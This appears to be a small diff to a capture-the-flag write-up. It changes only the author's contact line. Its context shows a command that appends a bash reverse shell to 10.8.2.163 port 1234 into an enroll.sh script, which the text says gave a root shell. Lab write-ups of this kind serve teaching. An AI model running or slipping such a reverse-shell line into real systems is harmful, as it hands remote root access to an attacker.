@@ -391,7 +391,7 @@ echo 'bash -c "bash -i >& /dev/tcp/10.8.2.163/1234 0>&1"' >> toto/tata/enroll.sh
 
 And we got our root shell !! 
 
-Nice !! if u have any questions you can dm me on [Instagram](https://instagram.com/eliott.la) or on discord at 'ethicxz.'
+Nice !! If you have any questions you can dm me on discord : 'ethicxz.'
 
 
 
